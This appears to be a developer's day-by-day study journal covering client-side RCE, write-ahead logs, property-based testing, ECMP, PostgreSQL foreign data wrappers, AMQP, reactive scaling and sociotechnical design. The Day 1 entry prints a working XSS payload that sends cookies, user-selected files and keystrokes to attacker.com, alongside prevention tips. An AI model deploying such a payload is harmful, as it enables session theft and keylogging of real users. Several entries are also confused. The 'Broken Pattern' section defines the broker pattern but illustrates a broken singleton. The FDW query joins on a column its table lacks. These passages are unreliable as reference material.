day - 1

## Client-Side RCE(Remote Code Execution)

### Definition:

Client-Side Remote Code Execution (RCE) is a security vulnerability that allows an attacker to execute malicious code on a victim's device (browser, mobile app, or client application) by exploiting flaws in client-side software. Unlike server-side RCE, this targets the user's machine directly, potentially giving attackers access to local files, system resources, or personal data.

**Key Characteristics**

- Target: User's device/browser, not the server
- Execution context: Runs with user's privileges
- Attack vector: Malicious websites, downloads, or client applications
- Impact: Can access local files, steal data, install malware

### Example:

- XSS leading to Client-Side RCE
  Vulnerable Website (Forum):

```
<!-- Vulnerable comment system that doesn't sanitize input -->
<div class="comment">
    <!-- Attacker posts this "comment" -->
    <script>
        // Malicious payload executed in victim's browser

        // 1. Steal cookies and session data
        fetch('http://attacker.com/steal', {
            method: 'POST',
            body: 'cookies=' + document.cookie
        });

        // 2. Access local storage
        const userData = localStorage.getItem('userPreferences');

        // 3. Try to access local files (if permissions allow)
        if (window.File && window.FileReader) {
            // Trick user into selecting files
            const input = document.createElement('input');
            input.type = 'file';
            input.onchange = function(e) {
                const file = e.target.files[0];
                const reader = new FileReader();
                reader.onload = function(e) {
                    // Send file contents to attacker
                    fetch('http://attacker.com/files', {
                        method: 'POST',
                        body: e.target.result
                    });
                };
                reader.readAsText(file);
            };
            input.click();
        }

        // 4. Keylogger
        document.addEventListener('keypress', function(e) {
            fetch('http://attacker.com/keys', {
                method: 'POST',
                body: 'key=' + e.key
            });
        });
    </script>
</div>
```

What happens when victim visits:

```
1. Victim visits forum page
2. Malicious script executes in victim's browser
3. Script runs with victim's permissions
4. Attacker gains access to:
   - Cookies and session tokens
   - Local storage data
   - Potentially local files
   - Keystroke logging
```

Prevention:

```
// ✅ Secure practices
// 1. Input sanitization
const sanitized = DOMPurify.sanitize(userInput);

// 2. Content Security Policy
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'self'">

// 3. Secure Electron config
webPreferences: {
    nodeIntegration: false,
    contextIsolation: true,
    preload: path.join(__dirname, 'preload.js')
}
```

---

day - 2

## Write Ahead Log(WAL)

### Definition:

Write Ahead Log (WAL) is a technique used in distributed systems where all changes are first written to a durable log before being applied to the actual data. This ensures data consistency, enables crash recovery, and helps maintain data integrity across multiple nodes. The key principle is: "log first, then apply changes."

### Example:

- PostgreSQL Database Cluster

```
-- User executes: UPDATE users SET balance = 500 WHERE id = 123;

-- Step 1: WAL entry written to disk FIRST
WAL Record:
{
  "lsn": "0/1B000028",
  "type": "UPDATE",
  "table": "users",
  "old_data": {"id": 123, "balance": 400},
  "new_data": {"id": 123, "balance": 500},
  "transaction_id": "TXN_456"
}

-- Step 2: Only AFTER WAL is on disk, apply to database
-- Step 3: Eventually, WAL gets replicated to standby servers
```

Recovery Process:

```
Primary Server Crashes!

Standby Server:
1. Reads WAL from shared storage
2. Replays all WAL entries since last checkpoint
3. Becomes new primary
4. No data lost! ✓
```

WAL in Distributed Systems:

```
┌─────────────┐    ┌─────────────┐    ┌─────────────┐
│   Client    │    │   Node 1    │    │   Node 2    │
└─────────────┘    └─────────────┘    └─────────────┘
       │                   │                   │
       │ 1. Write Request  │                   │
       ├──────────────────>│                   │
       │                   │ 2. Write to WAL   │
       │                   ├──────────────────>│
       │                   │ 3. WAL Synced     │
       │                   │<──────────────────┤
       │                   │ 4. Apply Changes  │
       │                   │ 5. Apply Changes  │
       │                   ├──────────────────>│
       │ 6. Success        │                   │
       │<──────────────────┤                   │
```

---

Day - 3

## Property-Based Testing

### Definition:

Property-Based Testing is a software testing approach that verifies general properties or invariants of your code by automatically generating hundreds or thousands of random test inputs. Instead of writing specific test cases with fixed inputs and outputs, you define properties that should always be true, and the testing framework generates diverse inputs to try to break those properties.

### Example:

- Testing String Reverse Function

```
from hypothesis import given, strategies as st

def reverse_string(s):
    return s[::-1]

# Property-based tests
@given(st.text())
def test_reverse_properties(s):
    reversed_s = reverse_string(s)

    # Property 1: Length preserved
    assert len(reversed_s) == len(s)

    # Property 2: Reversing twice gives original
    assert reverse_string(reversed_s) == s

    # Property 3: First char becomes last char
    if len(s) > 0:
        assert s[0] == reversed_s[-1]
        assert s[-1] == reversed_s[0]

# Hypothesis automatically generates:
# "", "a", "hello", "🙂🎉", "\n\t", "a" * 1000, etc.
```

- Testing Banking Transfer System

```
class BankAccount {
    private BigDecimal balance;

    public void transfer(BankAccount to, BigDecimal amount) {
        if (balance.compareTo(amount) >= 0) {
            this.balance = this.balance.subtract(amount);
            to.balance = to.balance.add(amount);
        } else {
            throw new InsufficientFundsException();
        }
    }
}

@Property
public void transferProperties(
    @ForAll @BigRange(min = "0", max = "10000") BigDecimal initialFromBalance,
    @ForAll @BigRange(min = "0", max = "10000") BigDecimal initialToBalance,
    @ForAll @BigRange(min = "0", max = "15000") BigDecimal transferAmount) {

    BankAccount from = new BankAccount(initialFromBalance);
    BankAccount to = new BankAccount(initialToBalance);

    BigDecimal totalBefore = initialFromBalance.add(initialToBalance);

    try {
        from.transfer(to, transferAmount);

        // Property 1: Money is conserved (no money created/destroyed)
        BigDecimal totalAfter = from.getBalance().add(to.getBalance());
        assertEquals(totalBefore, totalAfter);

        // Property 2: Transfer amount was deducted correctly
        assertEquals(initialFromBalance.subtract(transferAmount), from.getBalance());
        assertEquals(initialToBalance.add(transferAmount), to.getBalance());

    } catch (InsufficientFundsException e) {
        // Property 3: Exception only thrown when insufficient funds
        assertTrue(initialFromBalance.compareTo(transferAmount) < 0);

        // Property 4: Balances unchanged on failed transfer
        assertEquals(initialFromBalance, from.getBalance());
        assertEquals(initialToBalance, to.getBalance());
    }
}
```

Popular Tools:

- Java: JUnit-QuickCheck, jqwik
- Python: Hypothesis
- JavaScript: JSVerify, fast-check
- Haskell: QuickCheck (original)
- C#: FsCheck

---

Day - 4

## ECMP (Equal-Cost Multi-Path)

### Definition:

ECMP (Equal-Cost Multi-Path) is a networking strategy that distributes traffic across multiple paths of equal cost to reach the same destination. In software testing, ECMP testing involves verifying that network traffic is properly load-balanced across multiple equal routes, ensuring optimal bandwidth utilization, fault tolerance, and proper failover behavior.

**Key Features**

- Load distribution: Traffic spread across multiple equal paths
- Fault tolerance: Automatic rerouting when paths fail
- Bandwidth utilization: Maximum use of available network capacity
- Dynamic balancing: Real-time adjustment based on network conditions

### Example:

- Data Center Network Testing
  Network Setup:

```
[Client]
        |
   [Load Balancer]
    /    |    \
Path A  Path B  Path C  (All equal cost)
   |      |      |
[Server1][Server2][Server3]
```

---

Day - 5

## Foreign Data Wrapper(FDW)

### Definition:

Foreign Data Wrappers (FDW) is a PostgreSQL feature that allows you to access and query data from external sources (other databases, files, APIs, web services) as if they were regular tables in your local database. It creates a "virtual window" to remote data without actually storing it locally, enabling seamless integration across different data systems.

**Key Features**

- Transparent access: Query external data using standard SQL
- Real-time data: Always fetches current data from source
- No data duplication: Data stays in original location
- Cross-database joins: Combine local and remote data
- Multiple sources: Connect to various database types and services

### Example:

- E-commerce company with data in multiple systems

```
-- Connect to different data sources

-- 1. Sales data in MySQL
CREATE FOREIGN TABLE mysql_sales (
    sale_id INTEGER,
    product_id INTEGER,
    amount DECIMAL(10,2),
    sale_date DATE
) SERVER mysql_server OPTIONS (table_name 'sales');

-- 2. Product data in MongoDB
CREATE FOREIGN TABLE mongo_products (
    product_id INTEGER,
    product_name TEXT,
    category TEXT,
    price DECIMAL(10,2)
) SERVER mongo_server OPTIONS (collection 'products');

-- 3. Customer data in CSV files
CREATE FOREIGN TABLE csv_customers (
    customer_id INTEGER,
    name TEXT,
    region TEXT,
    signup_date DATE
) SERVER file_server OPTIONS (
    filename '/data/customers.csv',
    format 'csv',
    header 'true'
);

-- 4. Web analytics from REST API
CREATE FOREIGN TABLE api_pageviews (
    page_url TEXT,
    views INTEGER,
    date DATE
) SERVER api_server OPTIONS (
    endpoint 'https://analytics.company.com/api/pageviews'
);
```

- Cross-System Analytics Query

```
-- Generate comprehensive sales report combining all sources
SELECT
    mp.category,
    mp.product_name,
    cc.region,
    SUM(ms.amount) as total_sales,
    COUNT(ms.sale_id) as num_transactions,
    AVG(apv.views) as avg_page_views
FROM mysql_sales ms
JOIN mongo_products mp ON ms.product_id = mp.product_id
JOIN csv_customers cc ON ms.customer_id = cc.customer_id
LEFT JOIN api_pageviews apv ON apv.page_url LIKE '%' || mp.product_name || '%'
WHERE ms.sale_date >= '2024-01-01'
GROUP BY mp.category, mp.product_name, cc.region
ORDER BY total_sales DESC;
```

---

Day - 8

## Broken Pattern

### Definition:

The broker pattern, also known as the intermediary pattern, inserts a middleman called a broker between service users (also known as clients) and service providers (servers). The client is fully disconnected from the servers and has no knowledge of them. When a client requires a service, it asks a broker over a service interface, and the broker forwards the request to the appropriate server, which handles the request. The server returns the outcome of its action to the broker that forwards the result (together with any exceptions) to the client that initiated the request.

### Example:

- Broken Singleton Pattern

```
// BROKEN: Not thread-safe, can create multiple instances
public class DatabaseConnection {
    private static DatabaseConnection instance;
    private Connection connection;

    private DatabaseConnection() {
        // Expensive database connection setup
        this.connection = DriverManager.getConnection("jdbc:mysql://localhost/db");
    }

    // PROBLEM: Two threads can both see instance as null
    public static DatabaseConnection getInstance() {
        if (instance == null) {
            instance = new DatabaseConnection();  // Race condition!
        }
        return instance;
    }

    public void executeQuery(String sql) {
        // PROBLEM: Single connection shared by all threads
        Statement stmt = connection.createStatement();
        stmt.execute(sql);  // Concurrent access issues!
    }
}

// Usage that breaks:
// Thread 1: DatabaseConnection.getInstance()
// Thread 2: DatabaseConnection.getInstance() (simultaneously)
// Result: Two instances created, defeating Singleton purpose
```

---

day - 9

## AMQP (Advanced Message Queuing Protocol)

### Definition:

AMQP (Advanced Message Queuing Protocol) is an open standard messaging protocol that enables reliable, secure, and interoperable message communication between applications and systems. It provides features like message routing, queuing, reliability guarantees, and security, making it ideal for building distributed systems that need asynchronous communication between components.

**Key Features**

- Message routing: Flexible routing using exchanges and binding keys
- Reliability: Message persistence, acknowledgments, and delivery guarantees
- Interoperability: Works across different platforms and languages
- Security: Built-in authentication, authorization, and encryption
- Flow control: Prevents message overflow and system overload

### Example:

Microservices Communication

```
[Order Service] ──→ [AMQP Exchange] ──→ [Payment Queue] ──→ [Payment Service]
                         │
                         ├──→ [Inventory Queue] ──→ [Inventory Service]
                         │
                         └──→ [Shipping Queue] ──→ [Shipping Service]
```

---

day - 10

## Reactive Scaling

### Definition:

Reactive Scaling is an automatic system behavior where computing resources (servers, containers, etc.) are added or removed in response to current demand or performance metrics. The system "reacts" to changes in workload by scaling up when busy and scaling down when idle.

**How It Works**

- Monitor metrics: CPU usage, memory, request queue length
- Trigger scaling: When thresholds are crossed
- Add/remove resources: Automatically spin up or shut down instances
- Return to baseline: Scale back down when demand decreases

### Example:

**Netflix on Friday Night:**

**Normal Day (Tuesday 2 PM):**

- Low viewership = 100 servers running
- CPU usage: 30%

**Friday Night (8 PM):**

- Everyone starts watching = demand spikes
- CPU usage hits 80% threshold
- Reactive scaling triggers: Automatically adds 300 more servers
- Total: 400 servers handling the load

**Late Night (2 AM):**

- Viewership drops = CPU usage falls to 20%
- Reactive scaling triggers: Automatically removes 250 servers
- Back to 150 servers (slightly higher baseline for weekend)

---

day - 11

## Sociotechnical Design in Software Development

### Definition:

Sociotechnical Design is an approach to software development that considers both technical systems and human/social factors as equally important and interconnected. It recognizes that successful software solutions must account for how people work, communicate, collaborate, and organize themselves, not just the technical architecture. The goal is to design systems that fit naturally into human workflows and social structures.

**Key Principles**

- Human-centered: Design around how people actually work
- Social context: Consider team dynamics, culture, and communication patterns
- Technical-social alignment: Technology should support, not hinder, social interactions
- Organizational fit: Systems should match organizational structure and processes
- Continuous adaptation: Design evolves with changing social and technical needs

### Example:

```
Like designing a kitchen - you don't just consider the technical specs of appliances (technical design), but also how the family cooks together, their eating habits, cultural food preferences, who does the cleaning, and how they move around the space (sociotechnical design). A perfectly efficient kitchen layout that ignores how the family actually lives and works together will be frustrating and unused!
```

---
